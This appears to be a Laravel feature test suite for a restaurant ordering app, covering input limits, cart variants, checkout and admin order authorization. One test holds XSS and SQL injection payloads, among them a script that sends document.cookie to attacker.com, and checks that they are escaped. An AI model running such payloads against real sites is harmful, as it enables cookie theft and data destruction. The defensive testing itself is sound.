<?php

namespace Tests\Feature\Adversarial;

use App\Models\Category;
use App\Models\Order;
use App\Models\OrderItem;
use App\Models\Page;
use App\Models\Product;
use App\Models\ProductVariant;
use App\Models\Setting;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

class AdversarialStressTest extends TestCase
{
    use RefreshDatabase;

    protected User $adminUser;
    protected User $regularUser;
    protected Category $category;
    protected Product $product;

    protected function setUp(): void
    {
        parent::setUp();

        // Seed basic settings
        Setting::set('restaurant_name', 'Stress Test Bistro', 'string');
        Setting::set('currency_symbol', '$', 'string');
        Setting::set('tax_rate', '10', 'number');
        Setting::set('delivery_fee', '5.00', 'number');

        // Create users
        $this->adminUser = User::factory()->create([
            'email' => 'admin@stresstest.com',
            'is_admin' => true,
        ]);

        $this->regularUser = User::factory()->create([
            'email' => 'customer@stresstest.com',
            'is_admin' => false,
        ]);

        // Create sample category and base product
        $this->category = Category::create([
            'name' => 'Signature Pizzas',
            'slug' => 'signature-pizzas',
            'is_active' => true,
            'sort_order' => 1,
        ]);

        $this->product = Product::create([
            'category_id' => $this->category->id,
            'name' => 'Margherita Supreme',
            'slug' => 'margherita-supreme',
            'description' => 'Fresh basil, organic mozzarella, san marzano tomato sauce.',
            'base_price' => 14.99,
            'is_available' => true,
            'has_variants' => true,
        ]);
    }

    /* =========================================================================
     * 1. BOUNDARY INPUTS & EXTREME STRESS TESTS
     * ========================================================================= */

    /**
     * Test admin product creation boundary with massive string (>255 characters).
     */
    public function test_admin_product_creation_rejects_massive_string_inputs(): void
    {
        $massiveName = str_repeat('A', 500); // 500 chars > 255 max

        $response = $this->actingAs($this->adminUser)->post('/admin/products', [
            'category_id' => $this->category->id,
            'name' => $massiveName,
            'base_price' => 19.99,
            'is_available' => true,
        ]);

        $response->assertSessionHasErrors(['name']);
        $this->assertDatabaseMissing('products', ['name' => $massiveName]);
    }

    /**
     * Test admin product creation boundary with empty required fields.
     */
    public function test_admin_product_creation_rejects_empty_required_inputs(): void
    {
        $response = $this->actingAs($this->adminUser)->post('/admin/products', [
            'category_id' => '',
            'name' => '',
            'base_price' => '',
        ]);

        $response->assertSessionHasErrors(['category_id', 'name', 'base_price']);
    }

    /**
     * Test admin product creation rejects negative base price.
     */
    public function test_admin_product_creation_rejects_negative_base_price(): void
    {
        $response = $this->actingAs($this->adminUser)->post('/admin/products', [
            'category_id' => $this->category->id,
            'name' => 'Negative Price Pizza',
            'base_price' => -15.50,
            'is_available' => true,
        ]);

        $response->assertSessionHasErrors(['base_price']);
        $this->assertDatabaseMissing('products', ['name' => 'Negative Price Pizza']);
    }

    /**
     * Test admin product creation accepts zero base price (free promotional item).
     */
    public function test_admin_product_creation_accepts_zero_base_price_for_promotions(): void
    {
        $response = $this->actingAs($this->adminUser)->post('/admin/products', [
            'category_id' => $this->category->id,
            'name' => 'Free Promotional Breadstick',
            'base_price' => 0.00,
            'is_available' => true,
        ]);

        $response->assertRedirect('/admin/products');
        $this->assertDatabaseHas('products', [
            'name' => 'Free Promotional Breadstick',
            'base_price' => 0.00,
        ]);
    }

    /**
     * Test admin product variant accepts negative price adjustment (discounts).
     */
    public function test_admin_product_variant_accepts_negative_price_adjustment_discount(): void
    {
        $response = $this->actingAs($this->adminUser)->post("/admin/products/{$this->product->id}/variants", [
            'name' => 'Small Size (-$3.00)',
            'type' => 'size',
            'price_adjustment' => -3.00,
            'is_active' => true,
        ]);

        $response->assertRedirect();
        $this->assertDatabaseHas('product_variants', [
            'product_id' => $this->product->id,
            'name' => 'Small Size (-$3.00)',
            'price_adjustment' => -3.00,
        ]);
    }

    /**
     * Test checkout input length boundaries (customer_name max 255, customer_phone max 50, order_notes max 1000).
     */
    public function test_checkout_enforces_maximum_field_length_boundaries(): void
    {
        $cart = [
            'item_1' => [
                'item_key' => 'item_1',
                'product_id' => $this->product->id,
                'product_name' => $this->product->name,
                'price' => 14.99,
                'quantity' => 1,
                'subtotal' => 14.99,
            ],
        ];

        // 1. customer_name > 255 chars
        $resName = $this->withSession(['cart' => $cart])->post('/checkout', [
            'customer_name' => str_repeat('X', 256),
            'customer_email' => 'valid@test.com',
            'customer_phone' => '555-1234',
            'order_type' => 'pickup',
            'payment_method' => 'cod',
        ]);
        $resName->assertSessionHasErrors(['customer_name']);

        // 2. customer_phone > 50 chars
        $resPhone = $this->withSession(['cart' => $cart])->post('/checkout', [
            'customer_name' => 'Valid Name',
            'customer_email' => 'valid@test.com',
            'customer_phone' => str_repeat('9', 51),
            'order_type' => 'pickup',
            'payment_method' => 'cod',
        ]);
        $resPhone->assertSessionHasErrors(['customer_phone']);

        // 3. order_notes > 1000 chars
        $resNotes = $this->withSession(['cart' => $cart])->post('/checkout', [
            'customer_name' => 'Valid Name',
            'customer_email' => 'valid@test.com',
            'customer_phone' => '555-1234',
            'order_type' => 'pickup',
            'order_notes' => str_repeat('N', 1001),
            'payment_method' => 'cod',
        ]);
        $resNotes->assertSessionHasErrors(['order_notes']);
    }

    /**
     * Test cart add rejects negative, zero, and non-integer quantities.
     */
    public function test_cart_add_rejects_zero_negative_and_non_integer_quantities(): void
    {
        // Zero quantity
        $resZero = $this->post('/cart/add', [
            'product_id' => $this->product->id,
            'quantity' => 0,
        ]);
        $resZero->assertSessionHasErrors(['quantity']);

        // Negative quantity
        $resNeg = $this->post('/cart/add', [
            'product_id' => $this->product->id,
            'quantity' => -5,
        ]);
        $resNeg->assertSessionHasErrors(['quantity']);

        // String quantity
        $resString = $this->post('/cart/add', [
            'product_id' => $this->product->id,
            'quantity' => 'five',
        ]);
        $resString->assertSessionHasErrors(['quantity']);
    }

    /**
     * Test cart handles extreme quantity without integer overflow or PHP fatal error.
     */
    public function test_cart_handles_extreme_large_quantity_calculation(): void
    {
        $extremeQty = 10000;

        $response = $this->post('/cart/add', [
            'product_id' => $this->product->id,
            'quantity' => $extremeQty,
        ]);

        $response->assertRedirect();
        $cart = session('cart');
        $this->assertNotEmpty($cart);

        $itemKey = "item_{$this->product->id}_simple";
        $this->assertEquals($extremeQty, $cart[$itemKey]['quantity']);
        $this->assertEquals(round(14.99 * $extremeQty, 2), $cart[$itemKey]['subtotal']);

        // Verify cart page renders with extreme subtotal
        $cartPage = $this->get('/cart');
        $cartPage->assertStatus(200);
        $cartPage->assertSee(number_format(round(14.99 * $extremeQty, 2), 2));
    }

    /* =========================================================================
     * 2. CART CONCURRENCY & VARIANT INTEGRITY TESTS
     * ========================================================================= */

    /**
     * Test adding multiple distinct variants of the same product into session cart.
     */
    public function test_cart_maintains_multiple_variant_combinations_of_same_product_independently(): void
    {
        $small = ProductVariant::create([
            'product_id' => $this->product->id,
            'name' => 'Small',
            'type' => 'size',
            'price_adjustment' => -2.00, // $12.99
            'is_active' => true,
        ]);

        $medium = ProductVariant::create([
            'product_id' => $this->product->id,
            'name' => 'Medium',
            'type' => 'size',
            'price_adjustment' => 0.00, // $14.99
            'is_active' => true,
        ]);

        $large = ProductVariant::create([
            'product_id' => $this->product->id,
            'name' => 'Large',
            'type' => 'size',
            'price_adjustment' => 4.50, // $19.49
            'is_active' => true,
        ]);

        // Add Simple (no variant)
        $this->post('/cart/add', [
            'product_id' => $this->product->id,
            'quantity' => 1,
        ]);

        // Add Small
        $this->post('/cart/add', [
            'product_id' => $this->product->id,
            'variant_id' => $small->id,
            'quantity' => 2,
        ]);

        // Add Large
        $this->post('/cart/add', [
            'product_id' => $this->product->id,
            'variant_id' => $large->id,
            'quantity' => 1,
        ]);

        // Add Small again (should accumulate quantity to 3)
        $this->post('/cart/add', [
            'product_id' => $this->product->id,
            'variant_id' => $small->id,
            'quantity' => 1,
        ]);

        $cart = session('cart');
        $this->assertCount(3, $cart, 'Cart should contain 3 distinct keys: simple, small, large.');

        $simpleKey = "item_{$this->product->id}_simple";
        $smallKey = "item_{$this->product->id}_var_{$small->id}";
        $largeKey = "item_{$this->product->id}_var_{$large->id}";

        $this->assertEquals(1, $cart[$simpleKey]['quantity']);
        $this->assertEqualsWithDelta(14.99, $cart[$simpleKey]['price'], 0.001);
        $this->assertEquals(14.99, $cart[$simpleKey]['subtotal']);

        $this->assertEquals(3, $cart[$smallKey]['quantity']);
        $this->assertEqualsWithDelta(12.99, $cart[$smallKey]['price'], 0.001);
        $this->assertEquals(38.97, $cart[$smallKey]['subtotal']);

        $this->assertEquals(1, $cart[$largeKey]['quantity']);
        $this->assertEqualsWithDelta(19.49, $cart[$largeKey]['price'], 0.001);
        $this->assertEquals(19.49, $cart[$largeKey]['subtotal']);
    }

    /**
     * Test updating quantity to 0 removes the item from the session cart.
     */
    public function test_updating_cart_quantity_to_zero_removes_item(): void
    {
        $this->post('/cart/add', [
            'product_id' => $this->product->id,
            'quantity' => 3,
        ]);

        $itemKey = "item_{$this->product->id}_simple";
        $this->assertArrayHasKey($itemKey, session('cart', []));

        // Update quantity to 0
        $response = $this->patch('/cart/update', [
            'item_key' => $itemKey,
            'quantity' => 0,
        ]);

        $response->assertRedirect();
        $cart = session('cart', []);
        $this->assertArrayNotHasKey($itemKey, $cart);
    }

    /**
     * Test cross-product variant spoofing (sending variant ID from a different product).
     */
    public function test_adding_variant_belonging_to_different_product_does_not_apply_foreign_variant(): void
    {
        $otherProduct = Product::create([
            'category_id' => $this->category->id,
            'name' => 'Truffle Pasta',
            'slug' => 'truffle-pasta',
            'base_price' => 22.00,
            'is_available' => true,
        ]);

        $foreignVariant = ProductVariant::create([
            'product_id' => $otherProduct->id,
            'name' => 'Extra Truffle',
            'type' => 'addon',
            'price_adjustment' => 8.00,
            'is_active' => true,
        ]);

        // Attempt to add $this->product with $foreignVariant->id
        $this->post('/cart/add', [
            'product_id' => $this->product->id,
            'variant_id' => $foreignVariant->id,
            'quantity' => 1,
        ]);

        $cart = session('cart', []);
        // Since variant belongs to other product, it should NOT create a variant item for other product
        // or apply foreign variant pricing
        $itemKey = "item_{$this->product->id}_simple";
        $this->assertArrayHasKey($itemKey, $cart);
        $this->assertEqualsWithDelta(14.99, $cart[$itemKey]['price'], 0.001);
        $this->assertNull($cart[$itemKey]['variant_id']);
    }

    /**
     * Test updating and removing non-existent cart item keys does not crash application.
     */
    public function test_modifying_non_existent_item_key_handles_gracefully(): void
    {
        // Populate cart with 1 valid item
        $this->post('/cart/add', [
            'product_id' => $this->product->id,
            'quantity' => 1,
        ]);

        // Update non-existent key
        $responseUpdate = $this->patch('/cart/update', [
            'item_key' => 'item_non_existent_key_99999',
            'quantity' => 5,
        ]);
        $responseUpdate->assertRedirect();
        $cartAfterUpdate = session('cart');
        $this->assertCount(1, $cartAfterUpdate);

        // Remove non-existent key
        $responseRemove = $this->delete('/cart/remove/item_non_existent_key_99999');
        $responseRemove->assertRedirect();
        $cartAfterRemove = session('cart');
        $this->assertCount(1, $cartAfterRemove);
    }

    /**
     * Test clearing an already empty cart does not throw errors.
     */
    public function test_clearing_already_empty_cart_operates_cleanly(): void
    {
        $this->withSession(['cart' => []]);

        $response = $this->post('/cart/clear');
        $response->assertRedirect();
        $this->assertEmpty(session('cart', []));

        // Test JSON API response for clear
        $responseJson = $this->postJson('/cart/clear');
        $responseJson->assertStatus(200);
        $responseJson->assertJson([
            'success' => true,
            'cart_count' => 0,
        ]);
    }

    /**
     * Test adding non-existent product or variant ID to cart is rejected.
     */
    public function test_adding_non_existent_product_or_variant_fails_validation(): void
    {
        // Non-existent product ID
        $resProd = $this->post('/cart/add', [
            'product_id' => 999999,
            'quantity' => 1,
        ]);
        $resProd->assertSessionHasErrors(['product_id']);

        // Non-existent variant ID
        $resVar = $this->post('/cart/add', [
            'product_id' => $this->product->id,
            'variant_id' => 888888,
            'quantity' => 1,
        ]);
        $resVar->assertSessionHasErrors(['variant_id']);
    }

    /* =========================================================================
     * 3. CHECKOUT EDGE CASES & SECURITY INJECTION TESTS
     * ========================================================================= */

    /**
     * Test checkout validation requires delivery_address when order_type is delivery.
     */
    public function test_checkout_delivery_order_requires_delivery_address(): void
    {
        $cart = [
            'item_1' => [
                'item_key' => 'item_1',
                'product_id' => $this->product->id,
                'product_name' => $this->product->name,
                'price' => 14.99,
                'quantity' => 1,
                'subtotal' => 14.99,
            ],
        ];

        // Omitted delivery_address
        $response = $this->withSession(['cart' => $cart])->post('/checkout', [
            'customer_name' => 'Alice Delivery',
            'customer_email' => 'alice@test.com',
            'customer_phone' => '555-123-4567',
            'order_type' => 'delivery',
            'delivery_address' => '',
            'payment_method' => 'cod',
        ]);

        $response->assertSessionHasErrors(['delivery_address']);
        $this->assertDatabaseMissing('orders', ['customer_email' => 'alice@test.com']);
    }

    /**
     * Test checkout succeeds for pickup without delivery address.
     */
    public function test_checkout_pickup_order_succeeds_without_delivery_address(): void
    {
        $cart = [
            'item_1' => [
                'item_key' => 'item_1',
                'product_id' => $this->product->id,
                'product_name' => $this->product->name,
                'price' => 14.99,
                'quantity' => 2,
                'subtotal' => 29.98,
            ],
        ];

        $response = $this->withSession(['cart' => $cart])->post('/checkout', [
            'customer_name' => 'Bob Pickup',
            'customer_email' => 'bob@test.com',
            'customer_phone' => '555-987-6543',
            'order_type' => 'pickup',
            'payment_method' => 'cod',
        ]);

        $response->assertRedirect();
        $this->assertDatabaseHas('orders', [
            'customer_name' => 'Bob Pickup',
            'customer_email' => 'bob@test.com',
            'order_type' => 'pickup',
            'delivery_address' => null,
            'subtotal' => 29.98,
        ]);
    }

    /**
     * Test checkout rejects various malformed email formats.
     */
    public function test_checkout_rejects_malformed_email_formats(): void
    {
        $cart = [
            'item_1' => [
                'item_key' => 'item_1',
                'product_id' => $this->product->id,
                'product_name' => $this->product->name,
                'price' => 14.99,
                'quantity' => 1,
                'subtotal' => 14.99,
            ],
        ];

        $invalidEmails = [
            'plainaddress',
            '#@%^%#$@#$@#.com',
            '@example.com',
            'Joe Smith <email@example.com>',
            'email.example.com',
        ];

        foreach ($invalidEmails as $invalidEmail) {
            $response = $this->withSession(['cart' => $cart])->post('/checkout', [
                'customer_name' => 'Tester',
                'customer_email' => $invalidEmail,
                'customer_phone' => '555-0000',
                'order_type' => 'pickup',
                'payment_method' => 'cod',
            ]);

            $response->assertSessionHasErrors(['customer_email']);
        }
    }

    /**
     * Test XSS script and SQL injection payloads in customer notes and name are safely stored and escaped in rendering.
     */
    public function test_checkout_handles_xss_and_sql_injection_payloads_safely(): void
    {
        $cart = [
            'item_1' => [
                'item_key' => 'item_1',
                'product_id' => $this->product->id,
                'product_name' => $this->product->name,
                'price' => 14.99,
                'quantity' => 1,
                'subtotal' => 14.99,
            ],
        ];

        $xssName = '<script>alert("XSS Attack")</script>';
        $sqliNotes = "'; DROP TABLE orders; -- <script>document.location='http://attacker.com?c='+document.cookie</script>";

        $response = $this->withSession(['cart' => $cart])->post('/checkout', [
            'customer_name' => $xssName,
            'customer_email' => 'security@safe-restaurant.com',
            'customer_phone' => '555-HACK-PROT',
            'order_type' => 'pickup',
            'order_notes' => $sqliNotes,
            'payment_method' => 'cod',
        ]);

        $response->assertRedirect();

        // 1. Assert Database table still exists and record is safely stored
        $order = Order::where('customer_email', 'security@safe-restaurant.com')->first();
        $this->assertNotNull($order);
        $this->assertEquals($xssName, $order->customer_name);
        $this->assertEquals($sqliNotes, $order->order_notes);

        // 2. Assert customer confirmation view properly HTML-escapes raw tags
        $confirmationResponse = $this->get(route('order.confirmation', $order));
        $confirmationResponse->assertStatus(200);
        $confirmationResponse->assertSee('&lt;script&gt;alert(&quot;XSS Attack&quot;)&lt;/script&gt;', false);
        $confirmationResponse->assertDontSee('<script>alert("XSS Attack")</script>', false);

        // 3. Assert admin view properly HTML-escapes raw tags
        $adminOrderResponse = $this->actingAs($this->adminUser)->get(route('admin.orders.show', $order));
        $adminOrderResponse->assertStatus(200);
        $adminOrderResponse->assertSee('&lt;script&gt;alert(&quot;XSS Attack&quot;)&lt;/script&gt;', false);
        $adminOrderResponse->assertDontSee('<script>alert("XSS Attack")</script>', false);
    }

    /**
     * Test checkout calculation with delivery fee and tax.
     */
    public function test_checkout_delivery_correctly_computes_tax_and_delivery_fee(): void
    {
        Setting::set('tax_rate', '10', 'number'); // 10%
        Setting::set('delivery_fee', '5.00', 'number'); // $5.00

        $cart = [
            'item_1' => [
                'item_key' => 'item_1',
                'product_id' => $this->product->id,
                'product_name' => $this->product->name,
                'price' => 20.00,
                'quantity' => 2,
                'subtotal' => 40.00,
            ],
        ];

        // Subtotal = 40.00, Tax = 4.00, Delivery = 5.00 => Total = 49.00
        $response = $this->withSession(['cart' => $cart])->post('/checkout', [
            'customer_name' => 'Math Verification',
            'customer_email' => 'math@test.com',
            'customer_phone' => '555-1111',
            'order_type' => 'delivery',
            'delivery_address' => '123 Algorithm Lane',
            'payment_method' => 'cod',
        ]);

        $response->assertRedirect();

        $order = Order::where('customer_email', 'math@test.com')->first();
        $this->assertNotNull($order);
        $this->assertEquals(40.00, (float) $order->subtotal);
        $this->assertEquals(4.00, (float) $order->tax);
        $this->assertEquals(49.00, (float) $order->total);
    }

    /* =========================================================================
     * 4. ORDER FULFILLMENT INTEGRITY & AUTHORIZATION TESTS
     * ========================================================================= */

    /**
     * Test admin updating order status rejects invalid status enum values.
     */
    public function test_admin_order_status_update_rejects_invalid_enum_status(): void
    {
        $order = Order::create([
            'customer_name' => 'Order Tester',
            'customer_email' => 'order@test.com',
            'customer_phone' => '555-0000',
            'order_type' => 'pickup',
            'subtotal' => 14.99,
            'tax' => 1.50,
            'total' => 16.49,
            'payment_method' => 'cod',
            'payment_status' => Order::PAYMENT_PENDING,
            'order_status' => Order::STATUS_NEW,
        ]);

        // Attempt invalid order_status
        $responseInvalidOrder = $this->actingAs($this->adminUser)->patch("/admin/orders/{$order->id}/status", [
            'order_status' => 'hacked_status_corrupted',
            'payment_status' => Order::PAYMENT_PAID,
        ]);
        $responseInvalidOrder->assertSessionHasErrors(['order_status']);

        // Attempt invalid payment_status
        $responseInvalidPay = $this->actingAs($this->adminUser)->patch("/admin/orders/{$order->id}/status", [
            'order_status' => Order::STATUS_PREPARING,
            'payment_status' => 'super_paid_bypass',
        ]);
        $responseInvalidPay->assertSessionHasErrors(['payment_status']);

        // Verify status remained unchanged in DB
        $order->refresh();
        $this->assertEquals(Order::STATUS_NEW, $order->order_status);
        $this->assertEquals(Order::PAYMENT_PENDING, $order->payment_status);
    }

    /**
     * Test non-admin user cannot mutate or access order fulfillment management.
     */
    public function test_non_admin_user_cannot_mutate_or_manage_orders(): void
    {
        $order = Order::create([
            'customer_name' => 'Victim Order',
            'customer_email' => 'victim@test.com',
            'customer_phone' => '555-0000',
            'order_type' => 'pickup',
            'subtotal' => 20.00,
            'tax' => 2.00,
            'total' => 22.00,
            'payment_method' => 'cod',
            'payment_status' => Order::PAYMENT_PENDING,
            'order_status' => Order::STATUS_NEW,
        ]);

        // 1. Guest attempting status update
        $guestRes = $this->patch("/admin/orders/{$order->id}/status", [
            'order_status' => Order::STATUS_COMPLETED,
            'payment_status' => Order::PAYMENT_PAID,
        ]);
        $guestRes->assertRedirect('/login');

        // 2. Regular customer attempting status update
        $regularRes = $this->actingAs($this->regularUser)->patch("/admin/orders/{$order->id}/status", [
            'order_status' => Order::STATUS_COMPLETED,
            'payment_status' => Order::PAYMENT_PAID,
        ]);
        $regularRes->assertRedirect('/');

        // 3. Regular customer attempting order deletion
        $deleteRes = $this->actingAs($this->regularUser)->delete("/admin/orders/{$order->id}");
        $deleteRes->assertRedirect('/');
        $this->assertDatabaseHas('orders', ['id' => $order->id]);

        // 4. Regular customer accessing orders index
        $indexRes = $this->actingAs($this->regularUser)->get('/admin/orders');
        $indexRes->assertRedirect('/');

        // 5. Regular customer accessing order detail
        $showRes = $this->actingAs($this->regularUser)->get("/admin/orders/{$order->id}");
        $showRes->assertRedirect('/');
    }

    /**
     * Test admin valid status lifecycle progression and receipt printing.
     */
    public function test_admin_can_progress_order_lifecycle_and_print_receipt(): void
    {
        $order = Order::create([
            'customer_name' => 'Lifecycle Customer',
            'customer_email' => 'lifecycle@test.com',
            'customer_phone' => '555-3333',
            'order_type' => 'pickup',
            'subtotal' => 14.99,
            'tax' => 1.50,
            'total' => 16.49,
            'payment_method' => 'cod',
            'payment_status' => Order::PAYMENT_PENDING,
            'order_status' => Order::STATUS_NEW,
        ]);

        OrderItem::create([
            'order_id' => $order->id,
            'product_id' => $this->product->id,
            'product_name' => $this->product->name,
            'quantity' => 1,
            'unit_price' => 14.99,
            'total_price' => 14.99,
        ]);

        // 1. Transition New -> Preparing
        $resPrep = $this->actingAs($this->adminUser)->patch("/admin/orders/{$order->id}/status", [
            'order_status' => Order::STATUS_PREPARING,
            'payment_status' => Order::PAYMENT_PENDING,
        ]);
        $resPrep->assertRedirect();
        $order->refresh();
        $this->assertEquals(Order::STATUS_PREPARING, $order->order_status);

        // 2. Transition Preparing -> Ready & Paid
        $resReady = $this->actingAs($this->adminUser)->patch("/admin/orders/{$order->id}/status", [
            'order_status' => Order::STATUS_READY,
            'payment_status' => Order::PAYMENT_PAID,
        ]);
        $resReady->assertRedirect();
        $order->refresh();
        $this->assertEquals(Order::STATUS_READY, $order->order_status);
        $this->assertEquals(Order::PAYMENT_PAID, $order->payment_status);

        // 3. Transition Ready -> Completed
        $resComp = $this->actingAs($this->adminUser)->patch("/admin/orders/{$order->id}/status", [
            'order_status' => Order::STATUS_COMPLETED,
            'payment_status' => Order::PAYMENT_PAID,
        ]);
        $resComp->assertRedirect();
        $order->refresh();
        $this->assertEquals(Order::STATUS_COMPLETED, $order->order_status);

        // 4. View Printable Receipt as Admin
        $receiptRes = $this->actingAs($this->adminUser)->get("/admin/orders/{$order->id}/print");
        $receiptRes->assertStatus(200);
        $receiptRes->assertSee('Lifecycle Customer');
        $receiptRes->assertSee('Margherita Supreme');

        // 5. Admin Deletes Order
        $deleteRes = $this->actingAs($this->adminUser)->delete("/admin/orders/{$order->id}");
        $deleteRes->assertRedirect('/admin/orders');
        $this->assertDatabaseMissing('orders', ['id' => $order->id]);
    }
}
